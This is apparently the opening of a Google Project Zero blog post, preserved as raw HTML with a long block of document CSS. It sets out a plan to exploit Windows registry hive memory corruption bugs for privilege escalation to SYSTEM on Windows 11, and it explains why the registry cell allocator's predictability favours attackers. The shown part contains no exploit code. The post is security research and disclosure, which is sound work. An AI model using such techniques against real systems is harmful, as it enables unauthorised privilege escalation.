&quot;}.lst-kix_abtaez6amq7m-8&gt;li{counter-increment:lst-ctn-kix_abtaez6amq7m-8}.lst-kix_8kp8wobudiou-6&gt;li{counter-increment:lst-ctn-kix_8kp8wobudiou-6}.lst-kix_yn1qpyq8396u-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yn1qpyq8396u-4,lower-latin) &quot;. &quot;}ol.lst-kix_2fen9zw0vjz4-1.start{counter-reset:lst-ctn-kix_2fen9zw0vjz4-1 0}ol.lst-kix_2fen9zw0vjz4-2.start{counter-reset:lst-ctn-kix_2fen9zw0vjz4-2 0}.lst-kix_yn1qpyq8396u-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yn1qpyq8396u-0,decimal) &quot;. &quot;}.lst-kix_yn1qpyq8396u-2&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yn1qpyq8396u-2,lower-roman) &quot;. &quot;}ol.lst-kix_cuzd0pwxkzwj-6.start{counter-reset:lst-ctn-kix_cuzd0pwxkzwj-6 0}.lst-kix_l1re9pb3r2ti-8&gt;li{counter-increment:lst-ctn-kix_l1re9pb3r2ti-8}ol.lst-kix_8kp8wobudiou-1{list-style-type:none}.lst-kix_cuzd0pwxkzwj-7&gt;li{counter-increment:lst-ctn-kix_cuzd0pwxkzwj-7}ol.lst-kix_8kp8wobudiou-4{list-style-type:none}ol.lst-kix_8kp8wobudiou-5{list-style-type:none}ol.lst-kix_8kp8wobudiou-2{list-style-type:none}ol.lst-kix_8kp8wobudiou-3{list-style-type:none}ol.lst-kix_8kp8wobudiou-8{list-style-type:none}ol.lst-kix_hyrlma59f00u-3.start{counter-reset:lst-ctn-kix_hyrlma59f00u-3 0}ol.lst-kix_8kp8wobudiou-6{list-style-type:none}ol.lst-kix_8kp8wobudiou-7{list-style-type:none}ol.lst-kix_8kp8wobudiou-2.start{counter-reset:lst-ctn-kix_8kp8wobudiou-2 0}ol.lst-kix_wh3djbl2z8na-4.start{counter-reset:lst-ctn-kix_wh3djbl2z8na-4 0}ol.lst-kix_qux0xwfdwk15-4.start{counter-reset:lst-ctn-kix_qux0xwfdwk15-4 0}ol.lst-kix_hc7ktzssita9-7.start{counter-reset:lst-ctn-kix_hc7ktzssita9-7 0}ol.lst-kix_8kp8wobudiou-4.start{counter-reset:lst-ctn-kix_8kp8wobudiou-4 0}.lst-kix_qux0xwfdwk15-6&gt;li{counter-increment:lst-ctn-kix_qux0xwfdwk15-6}.lst-kix_hyrlma59f00u-1&gt;li{counter-increment:lst-ctn-kix_hyrlma59f00u-1}ol.lst-kix_abtaez6amq7m-7{list-style-type:none}ol.lst-kix_abtaez6amq7m-8{list-style-type:none}ol.lst-kix_abtaez6amq7m-3{list-style-type:none}.lst-kix_wh3djbl2z8na-3&gt;li{counter-increment:lst-ctn-kix_wh3djbl2z8na-3}ol.lst-kix_abtaez6amq7m-4{list-style-type:none}ol.lst-kix_abtaez6amq7m-5{list-style-type:none}ol.lst-kix_abtaez6amq7m-6{list-style-type:none}ol.lst-kix_abtaez6amq7m-0{list-style-type:none}.lst-kix_cuzd0pwxkzwj-6&gt;li{counter-increment:lst-ctn-kix_cuzd0pwxkzwj-6}ol.lst-kix_abtaez6amq7m-1{list-style-type:none}ol.lst-kix_abtaez6amq7m-2{list-style-type:none}ol.lst-kix_wh3djbl2z8na-5.start{counter-reset:lst-ctn-kix_wh3djbl2z8na-5 0}.lst-kix_qux0xwfdwk15-4&gt;li{counter-increment:lst-ctn-kix_qux0xwfdwk15-4}ol.lst-kix_l1re9pb3r2ti-6.start{counter-reset:lst-ctn-kix_l1re9pb3r2ti-6 0}.lst-kix_ndr66mjka4k5-1&gt;li:before{content:&quot;\0025cb   &quot;}.lst-kix_wh3djbl2z8na-5&gt;li{counter-increment:lst-ctn-kix_wh3djbl2z8na-5}.lst-kix_ndr66mjka4k5-2&gt;li:before{content:&quot;\0025a0   &quot;}.lst-kix_l1re9pb3r2ti-3&gt;li{counter-increment:lst-ctn-kix_l1re9pb3r2ti-3}ul.lst-kix_ndr66mjka4k5-1{list-style-type:none}ul.lst-kix_ndr66mjka4k5-0{list-style-type:none}ul.lst-kix_ndr66mjka4k5-3{list-style-type:none}ul.lst-kix_ndr66mjka4k5-2{list-style-type:none}ul.lst-kix_ndr66mjka4k5-5{list-style-type:none}ul.lst-kix_ndr66mjka4k5-4{list-style-type:none}.lst-kix_ndr66mjka4k5-5&gt;li:before{content:&quot;\0025a0   &quot;}ul.lst-kix_ndr66mjka4k5-7{list-style-type:none}ul.lst-kix_ndr66mjka4k5-6{list-style-type:none}ol.lst-kix_cuzd0pwxkzwj-1.start{counter-reset:lst-ctn-kix_cuzd0pwxkzwj-1 0}.lst-kix_ndr66mjka4k5-6&gt;li:before{content:&quot;\0025cf   &quot;}ul.lst-kix_ndr66mjka4k5-8{list-style-type:none}.lst-kix_abtaez6amq7m-2&gt;li{counter-increment:lst-ctn-kix_abtaez6amq7m-2}.lst-kix_cuzd0pwxkzwj-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_cuzd0pwxkzwj-4,lower-latin) &quot;. &quot;}ol.lst-kix_l1re9pb3r2ti-5.start{counter-reset:lst-ctn-kix_l1re9pb3r2ti-5 0}.lst-kix_2fen9zw0vjz4-7&gt;li{counter-increment:lst-ctn-kix_2fen9zw0vjz4-7}.lst-kix_8kp8wobudiou-7&gt;li{counter-increment:lst-ctn-kix_8kp8wobudiou-7}.lst-kix_cuzd0pwxkzwj-0&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_cuzd0pwxkzwj-0,decimal) &quot;. &quot;}.lst-kix_cuzd0pwxkzwj-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_cuzd0pwxkzwj-8,lower-roman) &quot;. &quot;}ol.lst-kix_hyrlma59f00u-7.start{counter-reset:lst-ctn-kix_hyrlma59f00u-7 0}.lst-kix_cuzd0pwxkzwj-7&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_cuzd0pwxkzwj-7,lower-latin) &quot;. &quot;}.lst-kix_wh3djbl2z8na-7&gt;li{counter-increment:lst-ctn-kix_wh3djbl2z8na-7}.lst-kix_cuzd0pwxkzwj-2&gt;li{counter-increment:lst-ctn-kix_cuzd0pwxkzwj-2}.lst-kix_qux0xwfdwk15-8&gt;li{counter-increment:lst-ctn-kix_qux0xwfdwk15-8}ol.lst-kix_qux0xwfdwk15-3.start{counter-reset:lst-ctn-kix_qux0xwfdwk15-3 0}.lst-kix_cuzd0pwxkzwj-3&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_cuzd0pwxkzwj-3,decimal) &quot;. &quot;}ol.lst-kix_hyrlma59f00u-6.start{counter-reset:lst-ctn-kix_hyrlma59f00u-6 0}.lst-kix_hyrlma59f00u-0&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_cuzd0pwxkzwj-2.start{counter-reset:lst-ctn-kix_cuzd0pwxkzwj-2 0}.lst-kix_hyrlma59f00u-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyrlma59f00u-1,lower-latin) &quot;. &quot;}.lst-kix_hyrlma59f00u-4&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyrlma59f00u-4,lower-latin) &quot;. &quot;}ol.lst-kix_8kp8wobudiou-5.start{counter-reset:lst-ctn-kix_8kp8wobudiou-5 0}.lst-kix_hyrlma59f00u-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyrlma59f00u-5,lower-roman) &quot;. &quot;}ol.lst-kix_cuzd0pwxkzwj-6{list-style-type:none}.lst-kix_hyrlma59f00u-8&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_hyrlma59f00u-8,lower-roman) &quot;. &quot;}ol.lst-kix_cuzd0pwxkzwj-7{list-style-type:none}ol.lst-kix_cuzd0pwxkzwj-4{list-style-type:none}ol.lst-kix_cuzd0pwxkzwj-5{list-style-type:none}ol.lst-kix_cuzd0pwxkzwj-2{list-style-type:none}ol.lst-kix_cuzd0pwxkzwj-3{list-style-type:none}ol.lst-kix_cuzd0pwxkzwj-0{list-style-type:none}ol.lst-kix_cuzd0pwxkzwj-1{list-style-type:none}.lst-kix_8kp8wobudiou-4&gt;li{counter-increment:lst-ctn-kix_8kp8wobudiou-4}.lst-kix_kzn99s8ciqwj-7&gt;li:before{content:&quot;\0025cb   &quot;}ol.lst-kix_cuzd0pwxkzwj-0.start{counter-reset:lst-ctn-kix_cuzd0pwxkzwj-0 0}ol.lst-kix_l1re9pb3r2ti-4.start{counter-reset:lst-ctn-kix_l1re9pb3r2ti-4 0}.lst-kix_abtaez6amq7m-0&gt;li{counter-increment:lst-ctn-kix_abtaez6amq7m-0}ol.lst-kix_qux0xwfdwk15-8.start{counter-reset:lst-ctn-kix_qux0xwfdwk15-8 0}.lst-kix_qux0xwfdwk15-1&gt;li{counter-increment:lst-ctn-kix_qux0xwfdwk15-1}ol.lst-kix_hc7ktzssita9-3.start{counter-reset:lst-ctn-kix_hc7ktzssita9-3 0}.lst-kix_8kp8wobudiou-2&gt;li{counter-increment:lst-ctn-kix_8kp8wobudiou-2}.lst-kix_hc7ktzssita9-3&gt;li{counter-increment:lst-ctn-kix_hc7ktzssita9-3}ol.lst-kix_hyrlma59f00u-8.start{counter-reset:lst-ctn-kix_hyrlma59f00u-8 0}.lst-kix_kzn99s8ciqwj-3&gt;li:before{content:&quot;\0025cf   &quot;}ol.lst-kix_cuzd0pwxkzwj-8{list-style-type:none}ol.lst-kix_hc7ktzssita9-0.start{counter-reset:lst-ctn-kix_hc7ktzssita9-0 0}.lst-kix_yn1qpyq8396u-8&gt;li{counter-increment:lst-ctn-kix_yn1qpyq8396u-8}.lst-kix_8kp8wobudiou-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_8kp8wobudiou-1,lower-latin) &quot;. &quot;}.lst-kix_hyrlma59f00u-4&gt;li{counter-increment:lst-ctn-kix_hyrlma59f00u-4}.lst-kix_hc7ktzssita9-8&gt;li{counter-increment:lst-ctn-kix_hc7ktzssita9-8}ol.lst-kix_qux0xwfdwk15-6.start{counter-reset:lst-ctn-kix_qux0xwfdwk15-6 0}.lst-kix_8kp8wobudiou-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_8kp8wobudiou-5,lower-roman) &quot;. &quot;}ol.lst-kix_hc7ktzssita9-2.start{counter-reset:lst-ctn-kix_hc7ktzssita9-2 0}ol.lst-kix_yn1qpyq8396u-0{list-style-type:none}.lst-kix_2fen9zw0vjz4-2&gt;li{counter-increment:lst-ctn-kix_2fen9zw0vjz4-2}ol.lst-kix_yn1qpyq8396u-4{list-style-type:none}ol.lst-kix_yn1qpyq8396u-3{list-style-type:none}.lst-kix_wh3djbl2z8na-0&gt;li{counter-increment:lst-ctn-kix_wh3djbl2z8na-0}ol.lst-kix_yn1qpyq8396u-2{list-style-type:none}ol.lst-kix_l1re9pb3r2ti-2.start{counter-reset:lst-ctn-kix_l1re9pb3r2ti-2 0}ol.lst-kix_yn1qpyq8396u-1{list-style-type:none}.lst-kix_yn1qpyq8396u-5&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yn1qpyq8396u-5,lower-roman) &quot;. &quot;}ol.lst-kix_yn1qpyq8396u-8{list-style-type:none}ol.lst-kix_yn1qpyq8396u-7{list-style-type:none}.lst-kix_yn1qpyq8396u-3&gt;li{counter-increment:lst-ctn-kix_yn1qpyq8396u-3}ol.lst-kix_yn1qpyq8396u-6{list-style-type:none}ol.lst-kix_yn1qpyq8396u-5{list-style-type:none}ol.lst-kix_hc7ktzssita9-8{list-style-type:none}ol.lst-kix_hc7ktzssita9-7{list-style-type:none}ol.lst-kix_8kp8wobudiou-8.start{counter-reset:lst-ctn-kix_8kp8wobudiou-8 0}ol.lst-kix_qux0xwfdwk15-5.start{counter-reset:lst-ctn-kix_qux0xwfdwk15-5 0}ol.lst-kix_hc7ktzssita9-1.start{counter-reset:lst-ctn-kix_hc7ktzssita9-1 0}.lst-kix_yn1qpyq8396u-1&gt;li:before{content:&quot;&quot; counter(lst-ctn-kix_yn1qpyq8396u-1,lower-latin) &quot;. &quot;}ol.lst-kix_hc7ktzssita9-0{list-style-type:none}.lst-kix_l1re9pb3r2ti-5&gt;li{counter-increment:lst-ctn-kix_l1re9pb3r2ti-5}ol.lst-kix_hc7ktzssita9-2{list-style-type:none}ol.lst-kix_hc7ktzssita9-1{list-style-type:none}ol.lst-kix_hc7ktzssita9-4{list-style-type:none}ol.lst-kix_hc7ktzssita9-3{list-style-type:none}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}ol.lst-kix_hc7ktzssita9-6{list-style-type:none}ol.lst-kix_hc7ktzssita9-5{list-style-type:none}ol.lst-kix_l1re9pb3r2ti-1.start{counter-reset:lst-ctn-kix_l1re9pb3r2ti-1 0}.lst-kix_cuzd0pwxkzwj-4&gt;li{counter-increment:lst-ctn-kix_cuzd0pwxkzwj-4}ol{margin:0;padding:0}table td,table th{padding:0}.ormwWEjHLs-c30{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;background-color:#d9d9d9;border-left-style:solid;border-bottom-width:1pt;width:251pt;border-top-color:#000000;border-bottom-style:solid}.ormwWEjHLs-c11{border-right-style:solid;padding:14.4pt 14.4pt 14.4pt 14.4pt;border-bottom-color:#f3f3f3;border-top-width:0pt;border-right-width:0pt;border-left-color:#f3f3f3;vertical-align:top;border-right-color:#f3f3f3;border-left-width:0pt;border-top-style:solid;background-color:#f3f3f3;border-left-style:solid;border-bottom-width:0pt;width:468pt;border-top-color:#f3f3f3;border-bottom-style:solid}.ormwWEjHLs-c39{border-right-style:solid;padding:14.4pt 14.4pt 14.4pt 14.4pt;border-bottom-color:#000000;border-top-width:0pt;border-right-width:0pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:0pt;border-top-style:solid;background-color:#f3f3f3;border-left-style:solid;border-bottom-width:0pt;width:468pt;border-top-color:#000000;border-bottom-style:solid}.ormwWEjHLs-c22{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:289pt;border-top-color:#000000;border-bottom-style:solid}.ormwWEjHLs-c33{border-right-style:solid;padding:5pt 5pt 5pt 5pt;border-bottom-color:#000000;border-top-width:1pt;border-right-width:1pt;border-left-color:#000000;vertical-align:top;border-right-color:#000000;border-left-width:1pt;border-top-style:solid;border-left-style:solid;border-bottom-width:1pt;width:251pt;border-top-color:#000000;border-bottom-style:solid}.ormwWEjHLs-c18{padding-top:14pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.ormwWEjHLs-c44{padding-top:0pt;padding-bottom:16pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.ormwWEjHLs-c24{padding-top:16pt;padding-bottom:4pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.ormwWEjHLs-c31{padding-top:18pt;padding-bottom:6pt;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.ormwWEjHLs-c3{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.ormwWEjHLs-c8{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:center}.ormwWEjHLs-c9{padding-top:0pt;padding-bottom:0pt;line-height:1.5;orphans:2;widows:2;text-align:left}.ormwWEjHLs-c29{padding-top:0pt;padding-bottom:0pt;line-height:1.0;text-align:left}.ormwWEjHLs-c26{padding-top:12pt;padding-bottom:12pt;line-height:1.5;text-align:left}.ormwWEjHLs-c1{color:#000000;text-decoration:none;vertical-align:baseline;font-style:normal}.ormwWEjHLs-c20{border-spacing:0;border-collapse:collapse;margin-right:auto}.ormwWEjHLs-c35{color:#434343;font-weight:400;font-size:14pt;font-family:&quot;Arial&quot;}.ormwWEjHLs-c40{color:#666666;font-weight:400;font-size:15pt;font-family:&quot;Arial&quot;}.ormwWEjHLs-c36{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.ormwWEjHLs-c19{margin-left:auto;border-spacing:0;border-collapse:collapse;margin-right:auto}.ormwWEjHLs-c13{text-decoration-skip-ink:none;-webkit-text-decoration-skip:none;color:#1155cc;text-decoration:underline}.ormwWEjHLs-c27{color:#666666;font-weight:400;font-size:12pt;font-family:&quot;Arial&quot;}.ormwWEjHLs-c34{padding-top:0pt;padding-bottom:0pt;line-height:1.5;text-align:left}.ormwWEjHLs-c41{-webkit-text-decoration-skip:none;text-decoration:underline;text-decoration-skip-ink:none}.ormwWEjHLs-c14{text-decoration:none;vertical-align:baseline;font-style:normal}.ormwWEjHLs-c0{font-size:9pt;font-weight:400;font-family:&quot;Roboto Mono&quot;}.ormwWEjHLs-c38{font-weight:400;font-size:16pt;font-family:&quot;Arial&quot;}.ormwWEjHLs-c7{font-weight:400;font-size:11pt;font-family:&quot;Arial&quot;}.ormwWEjHLs-c5{font-size:7pt;font-weight:400;font-family:&quot;Roboto Mono&quot;}.ormwWEjHLs-c10{font-weight:700;font-size:9pt;font-family:&quot;Roboto Mono&quot;}.ormwWEjHLs-c15{font-weight:400;font-size:11pt;font-family:Consolas,&quot;Courier New&quot;}.ormwWEjHLs-c28{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.ormwWEjHLs-c23{margin-left:36pt;text-indent:-18pt}.ormwWEjHLs-c16{margin-left:36pt;padding-left:0pt}.ormwWEjHLs-c45{font-size:11pt;font-family:&quot;Arial&quot;}.ormwWEjHLs-c21{font-style:italic}.ormwWEjHLs-c46{font-size:12pt}.ormwWEjHLs-c6{height:11pt}.ormwWEjHLs-c43{color:#0000ee}.ormwWEjHLs-c42{margin-left:36pt}.ormwWEjHLs-c17{font-weight:700}.ormwWEjHLs-c32{background-color:#d9d9d9}.ormwWEjHLs-c2{color:#188038}.ormwWEjHLs-c4{color:#37474f}.ormwWEjHLs-c37{background-color:#f9cb9c}.ormwWEjHLs-c25{color:#b80672}.ormwWEjHLs-c12{height:0pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}p{margin:0;color:#000000;font-size:11pt;font-family:&quot;Arial&quot;}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:&quot;Arial&quot;;line-height:1.5;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}li{line-height:1.5;}&lt;/style&gt;&lt;/head&gt;&lt;body class=&quot;c28 doc-content&quot;&gt;
 &lt;p class=&quot;c44 subtitle&quot; id=&quot;h.8fjdym9e6vir&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c46&quot;&gt;Posted by Mateusz Jurczyk, Google Project Zero&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;In the &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://googleprojectzero.blogspot.com/2025/05/the-windows-registry-adventure-7-attack-surface.html&quot;&gt;previous blog post&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, we focused on the general security analysis of the registry and how to effectively &lt;/span&gt;&lt;span&gt;approach finding&lt;/span&gt;&lt;span&gt;&amp;nbsp;vulnerabilities in it.&lt;/span&gt;&lt;span&gt;&amp;nbsp;Here, we &lt;/span&gt;&lt;span&gt;will direct our attention to the exploitation of hive-based memory corruption bugs, i.e., those that allow an attacker to overwrite data within an active hive mapping in memory.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This is a class of issues characteristic of the Windows registry&lt;/span&gt;&lt;span&gt;, but u&lt;/span&gt;&lt;span&gt;niversal enough that the techniques described here are applicable to &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues?q=CVE-2022-34707%20OR%20CVE-2022-34708%20OR%20CVE-2022-37956%20OR%20CVE-2022-37988%20OR%20CVE-2022-38037%20OR%20CVE-2023-21675%20OR%20CVE-2023-21748%20OR%20CVE-2023-23420%20OR%20CVE-2023-23421%20OR%20CVE-2023-23422%20OR%20CVE-2023-23423%20OR%20CVE-2023-28248%20OR%20CVE-2023-35382%20OR%20CVE-2023-38139%20OR%20CVE-2024-26182%20OR%20%20CVE-2024-43641%20OR%20CVE-2024-49114&quot;&gt;17&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;of my past vulnerabilities, as well as likely any similar bugs in the future.&lt;/span&gt;&lt;span&gt;&amp;nbsp;A&lt;/span&gt;&lt;span&gt;s we know, hives exhibit a very special behavior in terms of low-level memory management (how and where they are mapped in memory), handling of&lt;/span&gt;&lt;span&gt;&amp;nbsp;allocated&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;and freed m&lt;/span&gt;&lt;span&gt;emory chunks by a custom allocator, and the nature of data stored there.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;All this makes exploiting this type of vulnerability especially interesting from the offensive security perspective, which is why I would like to describe it here in detail.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Similar to any other type of memory corruption, t&lt;/span&gt;&lt;span&gt;he vast majority of hive memory corruption issues can be classified into two groups: spatial violations (such as buffer overflows)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2cnmRXF5pxU4eJk13OsumymAYXEqnnICfxVyIDcM5LyyV00On5OT-PDpfIxwUmrEwTt6m9ksAaDTYbKi08zTGXOjLfvFlRrAhGaATI2wq2TBL-yecg15_xe3UsXUOtgSoDXyywYB1J46EQv_cqP_kVMxkFMXtCGWA1-Iy3vsvgUmZFuCYUiQ5LoPTQ9c/s933/image5.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj2cnmRXF5pxU4eJk13OsumymAYXEqnnICfxVyIDcM5LyyV00On5OT-PDpfIxwUmrEwTt6m9ksAaDTYbKi08zTGXOjLfvFlRrAhGaATI2wq2TBL-yecg15_xe3UsXUOtgSoDXyywYB1J46EQv_cqP_kVMxkFMXtCGWA1-Iy3vsvgUmZFuCYUiQ5LoPTQ9c/s933/image5.png&quot; border=&quot;0&quot; alt=&quot;A diagram showing a corrupted memory cell overflowing an adjacent cell&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A diagram showing a corrupted memory cell overflowing an adjacent cell&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;and temporal violations, such as use-after-free conditions:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6FFGFmqEfSfaeWmlmZjdZeyMeHLk_IChZUwN5W6V0XP7o6_0zTxidHhwWTOToJS0TB5SUhsr5Zkf2-NYoGBwT3um1z625ZGni-ykzQbg7CNgU2eVbv05ts0iGxR6ttuIZJZchkpDDV7UOtw7lWGS21Udfk0eW7TSKabU50fGEVjr2KIZQbVURSRo84UE/s933/image19.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6FFGFmqEfSfaeWmlmZjdZeyMeHLk_IChZUwN5W6V0XP7o6_0zTxidHhwWTOToJS0TB5SUhsr5Zkf2-NYoGBwT3um1z625ZGni-ykzQbg7CNgU2eVbv05ts0iGxR6ttuIZJZchkpDDV7UOtw7lWGS21Udfk0eW7TSKabU50fGEVjr2KIZQbVURSRo84UE/s933/image19.png&quot; border=&quot;0&quot; alt=&quot;A diagram showing multiple invalid references to a freed cell&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A diagram showing multiple invalid references to a freed cell&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;In this write up, we will aim to select the most promising vulnerability candidate and then create a step-by-step exploit for it that will elevate the privileges of a regular user in the system, from Medium IL to system-level privileges. Our target will be Windows 11, and an additional requirement will be to successfully bypass all modern security mitigations. I have previously presented on this topic at OffensiveCon 2024 with a presentation titled &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://www.offensivecon.org/speakers/2024/mateusz-jurczyk.html&quot;&gt;&amp;quot;Practical Exploitation of Registry Vulnerabilities in the Windows Kernel&amp;quot;&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, and this blog post can be considered a supplement and expansion of the information shown there. Those deeply interested in the subject are encouraged to review the &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://j00ru.vexillium.org/slides/2024/offensivecon.pdf&quot;&gt;slides&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=qllMa2UUPvY&quot;&gt;recording&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&amp;nbsp;available from that presentation.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;ormwWEjHLs-c31&quot; id=&quot;h.igqgw067cokn&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c38&quot;&gt;Where to start: high-level overview of potential options&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Let&amp;#39;s start with a recap of some key points.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As you may recall, the Windows registry cell allocator (i.e., the internal HvAllocateCell, HvReallocateCell, and HvFreeCell functions) operates in a way that is very favorable for exploitation.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Firstly, it completely lacks any safeguards against memory corruption, and secondly, it has no element of randomness, making its behavior entirely predictable.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Consequently, there is no need to employ any &amp;quot;hive spraying&amp;quot; or other similar techniques known from typical heap exploitation &amp;ndash; if we manage to achieve the desired cell layout on a test machine, it will be reproducible on other computers without any additional steps.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;A potential exception could be carrying out attacks on global, shared hives within HKLM and HKU, as we don&amp;#39;t know their initial state, and some randomness may arise from operations performed concurrently by other applications.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Nevertheless, even this shouldn&amp;#39;t pose a particularly significant challenge.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;We can safely assume that arranging the memory layout of a hive is straightforward, and if we have some memory corruption capability within it, we will eventually be able to overwrite any type of &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;cell given some patience and experimentation.&lt;/span&gt;&lt;/p&gt;
